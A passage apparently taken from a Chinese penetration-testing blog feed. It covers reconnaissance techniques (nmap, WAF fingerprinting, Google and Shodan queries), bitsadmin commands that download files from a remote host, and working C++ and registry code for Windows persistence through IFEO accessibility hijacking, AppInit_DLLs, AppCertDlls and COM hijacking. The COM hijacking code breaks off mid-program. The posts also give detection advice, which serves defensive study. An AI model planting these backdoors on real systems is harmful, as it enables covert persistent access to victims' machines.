id="4、御剑后台扫描（自行下载）"><a href="#4、御剑后台扫描（自行下载）" class="headerlink" title="4、御剑后台扫描（自行下载）"></a>4、御剑后台扫描（自行下载）</h2><h1 id="五、-指纹"><a href="#五、-指纹" class="headerlink" title="五、 指纹"></a>五、 指纹</h1><h2 id="1、指纹识别"><a href="#1、指纹识别" class="headerlink" title="1、指纹识别"></a>1、指纹识别</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn -O ip</span><br><span class="line">nmap -sS -sV ip</span><br></pre></td></tr></table></figure><h2 id="2、中间件指纹识别"><a href="#2、中间件指纹识别" class="headerlink" title="2、中间件指纹识别"></a>2、中间件指纹识别</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一： 通过http返回消息中提取server字段</span><br><span class="line">方法二： nmap -sS -Pn -sV ip </span><br><span class="line">方法三： 构造错误界面返回信息查看中间件</span><br></pre></td></tr></table></figure><h2 id="3、web程序指纹识别"><a href="#3、web程序指纹识别" class="headerlink" title="3、web程序指纹识别"></a>3、web程序指纹识别</h2><ul><li>开发语言</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL 后缀名识别  .asp  .php   .jsp</span><br><span class="line">抓包，查看与后台交互点</span><br><span class="line">http返回消息头  x-Powered-By</span><br><span class="line">cookie可以识别， PHPSESSION --&gt;PHP  JSPSESSION --&gt; JSP  ASPSESSIONIDAASTCACQ --&gt;ASP</span><br></pre></td></tr></table></figure><ul><li>开发框架</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的thinkphp框架识别方法特定ico图标</span><br><span class="line">Action后缀 90%几率struts2或者webwork</span><br><span class="line">do后缀 50%几率spring mvc</span><br><span class="line">url路径&#x2F;action&#x2F;xxx70%几率struts2</span><br><span class="line">form后缀 60%几率spring mvc</span><br><span class="line">Vm后缀 90%几率VelocityViewServlet</span><br><span class="line">jsf后缀 99%几率Java Server Faces</span><br></pre></td></tr></table></figure><ul><li>第三方组件</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般包括流量统计、文件编辑器、模板引擎</span><br><span class="line">识别方法：一般目录扫描</span><br><span class="line">FCKeditor   </span><br><span class="line">CKEditor</span><br></pre></td></tr></table></figure><ul><li>CMS程序</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特定文件夹</span><br><span class="line">dede&#x2F;、admin&#x2F;admin_Login.aspx</span><br><span class="line">Powered by***</span><br><span class="line">网站favicon图标</span><br></pre></td></tr></table></figure><ul><li>数据库</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常规判断，asp-&gt;sql server，php-&gt;mysql，jsp-oracle</span><br><span class="line">网站错误信息</span><br><span class="line">端口服务，1443-&gt;sql server，3306-&gt;mysql，oracal-&gt;1521</span><br></pre></td></tr></table></figure><ul><li>在线探测</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wappalyzer插件</span><br><span class="line">云悉： http:&#x2F;&#x2F;www.yunsee.cn</span><br></pre></td></tr></table></figure><h2 id="4、防火墙指纹识别"><a href="#4、防火墙指纹识别" class="headerlink" title="4、防火墙指纹识别"></a>4、防火墙指纹识别</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80   域名  --script http-waf-fingerprint</span><br><span class="line">sqlmap  -u   360.cn  --identify-waf</span><br><span class="line">wafw00f工具    https:&#x2F;&#x2F;github.com&#x2F;EnableSecurity&#x2F;wafw00f</span><br><span class="line">python setup.py install   或者  pip install wafw00f</span><br></pre></td></tr></table></figure><h1 id="六、GoogleHacking"><a href="#六、GoogleHacking" class="headerlink" title="六、GoogleHacking"></a>六、GoogleHacking</h1><h2 id="1、语法"><a href="#1、语法" class="headerlink" title="1、语法"></a>1、语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ 强制搜索其后的一个单词</span><br><span class="line">- 把某个字忽略</span><br><span class="line">~ 同意词</span><br><span class="line">. 单一的通配符</span><br><span class="line">* 通配符，可代表多个字母</span><br><span class="line">&quot; &quot; 精确查询</span><br><span class="line">&quot;|&quot;或&quot;OR&quot; 只要符合多个关键字中的任意一个的结果予以显示</span><br></pre></td></tr></table></figure><h2 id="2、基本用法"><a href="#2、基本用法" class="headerlink" title="2、基本用法"></a>2、基本用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intext:key 搜索网页带有关键字的页面</span><br><span class="line">allintext:key 功能与intext，但是可以接多个关键字</span><br><span class="line">intitle:key 搜索网页标题中是否有所输入的文字</span><br><span class="line">allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用</span><br><span class="line">cache:url 查看指定URL快照</span><br><span class="line">filetype： 搜索指定类型文件</span><br><span class="line">info: 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用</span><br><span class="line">inurl: 搜索输入字符是否存在于URL中，可以与site结合找后台</span><br><span class="line">site： 搜索特定网站或者子域名</span><br><span class="line">related:URL 搜索与该URL相关的页面</span><br></pre></td></tr></table></figure><h2 id="3、高级用法"><a href="#3、高级用法" class="headerlink" title="3、高级用法"></a>3、高级用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site： 特定网站搜索，可以寻找子域名、域名、端口</span><br><span class="line">site: URL filetype:doc  搜索与该域名相关的doc文件</span><br><span class="line">site: URL filetype:doc 搜索与该域名相关的doc文件</span><br><span class="line">site: URL intitle： 登录搜索与该域名相关联关键词的网页</span><br><span class="line">site: URL inurl:&#x2F;login  搜索与该域名相关URL的网页</span><br><span class="line">site：36.110.213.* C段快速探测</span><br></pre></td></tr></table></figure><p>Google hacking语法收集网站 <a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/us</a></p><h1 id="七、网络空间搜索引擎"><a href="#七、网络空间搜索引擎" class="headerlink" title="七、网络空间搜索引擎"></a>七、网络空间搜索引擎</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan：www.shodan.io</span><br></pre></td></tr></table></figure><h2 id="1、基本语法"><a href="#1、基本语法" class="headerlink" title="1、基本语法"></a>1、基本语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hostname:&quot;360.cn&quot; 主机名</span><br><span class="line">port：23 搜索端口</span><br><span class="line">net：192.168.1.0&#x2F;24 CIDR格式的IP地址</span><br><span class="line">city:&quot;San Diego&quot; 城市</span><br><span class="line">product:&quot;Apache httpd” </span><br><span class="line">version:&quot;2.6.1” 软件版本</span><br><span class="line">os:“Windows7&quot; 操作系统</span><br><span class="line">country:&quot;CN” 国家简写</span><br><span class="line">org:&quot;google” 组织</span><br><span class="line">isp:&quot;China Telecom&quot; ISP服务商</span><br><span class="line">geo:&quot;38.4681，106.2731”</span><br></pre></td></tr></table></figure><h2 id="2、基本使用"><a href="#2、基本使用" class="headerlink" title="2、基本使用"></a>2、基本使用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索开放80端口的主机 port：80</span><br><span class="line">搜索开放80端口的主机，并且服务器是nginx port：80 product:&quot;nginx”</span><br><span class="line">C段探测  net:ip&#x2F;24</span><br><span class="line">搜索favicon:http.favicon.hash:-395680774 这里搜索的是标题栏的图标</span><br></pre></td></tr></table></figure><h2 id="3、其他"><a href="#3、其他" class="headerlink" title="3、其他"></a>3、其他</h2><p><a href="http://www.zoomeye.org" target="_blank" rel="noopener">钟馗之眼 http://www.zoomeye.org</a><br><a href="http://fofa.so" target="_blank" rel="noopener">fafo http://www.zoomeye.org</a></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>后门及持久化访问1----辅助功能镜像劫持</title>
    <url>/2019/08/15/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE1-%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:13:29 GMT+0800 (GMT+08:00) --><h1 id="代码及原理介绍"><a href="#代码及原理介绍" class="headerlink" title="代码及原理介绍"></a>代码及原理介绍</h1><p>为了使电脑更易于使用和访问，Windows添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。</p><p>一些常见的辅助功能如：</p><ul><li>C:\Windows\System32\sethc.exe 粘滞键 快捷键：按五次shift键</li><li>C:\Windows\System32\utilman.exe 设置中心 快捷键：Windows+U键</li></ul><p>在较早的Windows版本，只需要进行简单的二进制文件替换，比如，程序” C:\Windows\System32\utilman.exe”可以替换为“cmd.exe”。</p><p>对于在Windows Vista和Windows Server 2008及更高的版本中，替换的二进制文件受到了系统的保护，因此这里就需要另一项技术：映像劫持。</p><p>映像劫持，也被称为“IFEO”（Image File Execution Options）。当目标程序被映像劫持时，双击目标程序，系统会转而运行劫持程序，并不会运行目标程序。许多病毒会利用这一点来抑制杀毒软件的运行，并运行自己的程序。造成映像劫持的罪魁祸首就是参数“Debugger”，它是IFEO里第一个被处理的参数，系统如果发现某个程序文件在IFEO列表中，它就会首先来读取Debugger参数，如果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理，而仅仅把用户试图启动的程序作为Debugger参数里指定的程序文件名的参数发送过去。参数“Debugger”本来是为了让程序员能够通过双击程序文件直接进入调试器里调试自己的程序。现在却成了病毒的攻击手段。简单操作就是修改注册表，在“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option”中添加utilman.exe项，在此项中添加debugger键，键值为要启动的程序路径。</p><p>注意：Windows NT 和WindowsNT不一样！！！！</p><p>C++ 实现代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt; </span><br><span class="line">#include &lt;Windows.h&gt; </span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int test()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwDisposition;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	const char path[] &#x3D; &quot;C:\\hello.exe&quot;;</span><br><span class="line">	RegCreateKeyExA(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition);</span><br><span class="line">	RegSetValueExA(hKey, &quot;Debugger&quot;, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">	&#x2F;&#x2F;system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，我们自己的程序要放到相应的路径。</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>镜像劫持可由多种脚本进行完成，上面是利用C++的脚本，而下面则是reg注册表文件进行完成。另有其他方法，如：VBS等。</p><p>注册表代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00 </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe] </span><br><span class="line">&quot;Debugger&quot;&#x3D;&quot;C:&#x2F;&#x2F;hello.exe&quot;</span><br></pre></td></tr></table></figure><p>这段代码就是截取windows+U快捷键来运行自己想要运行的程序。Utilman.exe可以替换为自己想要截取的软件，hello.exe则是自己想要运行的文件。</p><p>首先将代码保存为reg文件，然后将hello.exe放入C盘根目录，以管理员身份运行注册表文件。</p><p>运行完后会添加如下健和值</p><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/2.png"><img src="2.png" alt="img"></a></p><p>在锁屏状态下效果图如下：</p><p><img src="3.png" alt="img"></p><p>本次复现在windows 7 sp1环境下进行，其他系统请自行测试。经测试，windows 10 1809已经不能实现。</p><h1 id="检查及清除方法"><a href="#检查及清除方法" class="headerlink" title="检查及清除方法"></a>检查及清除方法</h1><p>检查“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image</p><p>File Execution Option”注册表路径中的程序名称</p><p>其它适用于的辅助功能还有：</p><ul><li>屏幕键盘：C:\Windows\System32\osk.exe</li><li>放大镜：C:\Windows\System32\Magnify.exe</li><li>旁白：C:\Windows\System32\Narrator.exe</li><li>显示开关：C:\Windows\System32\DisplaySwitch.exe</li><li>应用程序开关：C:\Windows\System32\AtBroker.exe</li><li>现在大部分的杀毒软件都会监视注册表项来防御这种恶意行为。</li></ul><p>现在大部分的杀毒软件都会监视注册表项来防御这种恶意行为。</p><p>本文复现主要用来学习，请勿用于非法用途。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
  </entry>
  <entry>
    <title>bitsadmin windwos自带下载命令</title>
    <url>/2019/08/20/bitsadmin-windwos%E8%87%AA%E5%B8%A6%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:13:29 GMT+0800 (GMT+08:00) --><h3 id="bitsadmin的四种下载文件的方法"><a href="#bitsadmin的四种下载文件的方法" class="headerlink" title="bitsadmin的四种下载文件的方法"></a>bitsadmin的四种下载文件的方法</h3><p>一、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\1.txt</span><br></pre></td></tr></table></figure><p>二、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\1.txt</span><br></pre></td></tr></table></figure><p>三、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer qianxiao996 http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\1.txt</span><br></pre></td></tr></table></figure><p>四、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create qianxiao996</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\1.txt</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume qianxiao996</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info qianxiao996 &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete qianxiao996</span><br></pre></td></tr></table></figure><p>[danger]注意’C:\1.txt’的’&#39;不能丢，要不然会提示参数错误！[/danger]</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>文件下载</tag>
      </tags>
  </entry>
  <entry>
    <title>后门及持久化访问3----进程注入之AppInit_DLLs注册表项</title>
    <url>/2019/08/22/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE3-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8BAppInit-DLLs%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:13:29 GMT+0800 (GMT+08:00) --><h2 id="进程注入之AppInit-DLLs注册表项"><a href="#进程注入之AppInit-DLLs注册表项" class="headerlink" title="进程注入之AppInit_DLLs注册表项"></a>进程注入之AppInit_DLLs注册表项</h2><p>User32.dll被加载到进程时，会获取AppInit_DLLs注册表项，若有值，则调用LoadLibrary() API加载用户DLL。只会影响加载了user32.dll的进程。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include </span><br><span class="line">#include </span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int test()</span><br><span class="line">&#123;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	DWORD dwDisposition;</span><br><span class="line">	const char path[] &#x3D; &quot;C:\\dll.dll&quot;;</span><br><span class="line">	DWORD dwData &#x3D; 1;</span><br><span class="line">	RegCreateKeyExA(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition);</span><br><span class="line">	RegSetValueExA(hKey, &quot;AppInit_DLLs&quot;, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));</span><br><span class="line">	RegSetValueExA(hKey, &quot;LoadAppInit_DLLs&quot;, 0, REG_DWORD, (BYTE*)&amp; dwData, sizeof(DWORD));</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">	&#x2F;&#x2F;system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>将以上代码编译为exe文件，放到测试机运行会产生一下注册项<br>修改过后如下图所示：<br><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/1-1.png"><img src="3-1.png" alt="img"></a><br>dll代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(0, &quot;hello qianxiao996&quot;, &quot;AppCert&quot;, 0);</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行cmd.exe，就会发现cmd.exe已经加载指定dll，并弹框。<br><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/2-2.png"><img src="2-2.png" alt="img"></a><br>此注册表项下的每个库都会加载到每个加载User32.dll的进程中。User32.dll是一个非常常见的库，用于存储对话框等图形元素。恶意软件可以在Appinit_Dlls注册表项下插入其恶意库的位置，以使另一个进程加载其库。因此，当恶意软件修改此子键时，大多数进程将加载恶意库。</p><h2 id="检查及清除方法"><a href="#检查及清除方法" class="headerlink" title="检查及清除方法"></a>检查及清除方法</h2><ul><li>监测加载User32.dll的进程的dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。</li><li>监视AppInit_DLLs注册表值。</li><li>监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx。</li></ul><!-- rebuild by neat -->]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
  </entry>
  <entry>
    <title>后门及持久化访问2----进程注入之AppCertDlls 注册表项</title>
    <url>/2019/08/18/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE2-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8BAppCertDlls-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:13:29 GMT+0800 (GMT+08:00) --><h2 id="代码及原理介绍"><a href="#代码及原理介绍" class="headerlink" title="代码及原理介绍"></a>代码及原理介绍</h2><p>如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec</p><p>函数，那么此进程会获取HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\AppCertDlls注册表项，此项下的dll都会加载到此进程。</p><p>Win7版本下没有“AppCertDlls”项，需自己创建。</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt; </span><br><span class="line">#include &lt;Windows.h&gt; </span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int test()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwDisposition;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	const char path[] &#x3D; &quot;C:\\dll.dll&quot;;</span><br><span class="line">	RegCreateKeyExA(HKEY_LOCAL_MACHINE,&quot;SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition);</span><br><span class="line">	RegSetValueExA(hKey, &quot;Default&quot;, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	test();</span><br><span class="line">	&#x2F;&#x2F;system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dll代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">BOOL TestMutex()</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hMutex &#x3D; CreateMutexA(NULL, false, &quot;myself&quot;);</span><br><span class="line">	if (GetLastError() &#x3D;&#x3D; ERROR_ALREADY_EXISTS)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hMutex);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:  &#x2F;&#x2F;进程创建执行</span><br><span class="line">		if (TestMutex() &#x3D;&#x3D; 0)</span><br><span class="line">			return TRUE;</span><br><span class="line">		MessageBoxA(0, &quot;hello qianxiao996&quot;, &quot;AppCert&quot;, 0);</span><br><span class="line">	case DLL_THREAD_ATTACH:  &#x2F;&#x2F;进&#x3D;线程创建执行</span><br><span class="line">	case DLL_THREAD_DETACH:  &#x2F;&#x2F;进程结束执行</span><br><span class="line"> 	case DLL_PROCESS_DETACH: &#x2F;&#x2F;线程结束执行</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先将代码运行生成EXE和DLL，完整代码在上面，将DLL文件名改为dll.dll并放到相应路径。<br><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/1.png"><img src="1.png" alt="img"></a><br>然后以管理员运行exe文件，发现已经创建注册表<br><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/2-1.png"><img src="2-1.png" alt="img"></a><br>下面编写一个创建进程的测试程序来打开notepad.exe，代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt; </span><br><span class="line">#include &lt;Windows.h&gt; </span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO startupInfo &#x3D; &#123; 0 &#125;;</span><br><span class="line">	PROCESS_INFORMATION processInformation &#x3D; &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">	BOOL bSuccess &#x3D; CreateProcess(TEXT(&quot;C:\Windows\System32\notepad.exe&quot;), NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;startupInfo, &amp;processInformation);</span><br><span class="line"></span><br><span class="line">	if (bSuccess)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; &quot;Process started.&quot; &lt;&lt; endl</span><br><span class="line">			&lt;&lt; &quot;Process ID:\t&quot;</span><br><span class="line">			&lt;&lt; processInformation.dwProcessId &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; &quot;Cannot start process!&quot; &lt;&lt; endl</span><br><span class="line">			&lt;&lt; &quot;Error code:\t&quot; &lt;&lt; GetLastError() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	return system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当运行测试exe的时候创建了进程，便调用了dll.dll文件，弹出hello qianxiao996窗口。<br><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/08/3-1.png"><img src="3-1.png" alt="img"></a></p><h2 id="检查及清除方法"><a href="#检查及清除方法" class="headerlink" title="检查及清除方法"></a>检查及清除方法</h2><ul><li>监测dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。</li><li>监视AppCertDLL注册表值</li><li>监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx。</li></ul><!-- rebuild by neat -->]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
  </entry>
  <entry>
    <title>后门及持久化访问4----Com组件劫持</title>
    <url>/2019/08/23/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE4-Com%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:17:24 GMT+0800 (GMT+08:00) --><h2 id="代码及原理介绍"><a href="#代码及原理介绍" class="headerlink" title="代码及原理介绍"></a>代码及原理介绍</h2><p>​ COM是Component Object Model（组件对象模型）的缩写，COM组件由DLL和EXE形式发布的可执行代码所组成。每个COM组件都有一个CLSID，这个CLSID是注册的时候写进注册表的，可以把这个CLSID理解为这个组件最终可以实例化的子类的一个ID。这样就可以通过查询注册表中的CLSID来找到COM组件所在的dll的名称。所以要想COM劫持，必须精心挑选CLSID，尽量选择应用范围广的CLSID。这里，我们选择的CLSID为：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，来实现对CAccPropServicesClass 和 MMDeviceEnumerator的劫持。系统很多正常程序启动时需要调用这两个实例。例如计算器。</p><p>Dll存放的位置：//%APPDATA%Microsoft/Installer/{BCDE0395-E52F-467C-8E3D-C4579291692E}</p><p>接下来就是修改注册表，在指定路径添加文件，具体代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt; </span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	string type&#x3D;argv[1];</span><br><span class="line">	if (argc &gt; 1) &#123;</span><br><span class="line">		HKEY hKey;</span><br><span class="line">		DWORD dwDisposition;</span><br><span class="line">		&#x2F;&#x2F;%APPDATA%Microsoft&#x2F;Installer&#x2F;&#123;BCDE0395-E52F-467C-8E3D-C45792916&#x2F;&#x2F;92E&#125;</span><br><span class="line">		char system1[] &#x3D; &quot;C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Installer\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\\qianxiao996.dll&quot;;</span><br><span class="line">		char system2[] &#x3D; &quot;Apartment&quot;;</span><br><span class="line">		string defaultPath &#x3D; &quot;C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Installer\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;&quot;;</span><br><span class="line">		string szSaveName &#x3D; &quot;C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Installer\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\\qianxiao996.dll&quot;;</span><br><span class="line">		if (&quot;-go&quot; &#x3D;&#x3D; type)</span><br><span class="line">		&#123;</span><br><span class="line">			&#x2F;&#x2F;string folderPath &#x3D; defaultPath + &quot;\\testFolder&quot;;</span><br><span class="line">			string command;</span><br><span class="line">			command &#x3D; &quot;mkdir -p &quot; + defaultPath;</span><br><span class="line">			if (ERROR_SUCCESS !&#x3D; RegCreateKeyExA(HKEY_CURRENT_USER,</span><br><span class="line">				&quot;Software\\Classes\\CLSID\\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\\InprocServer32&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;创建注册表失败！&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">			&#125;</span><br><span class="line">			if (ERROR_SUCCESS !&#x3D; RegSetValueExA(hKey, NULL, 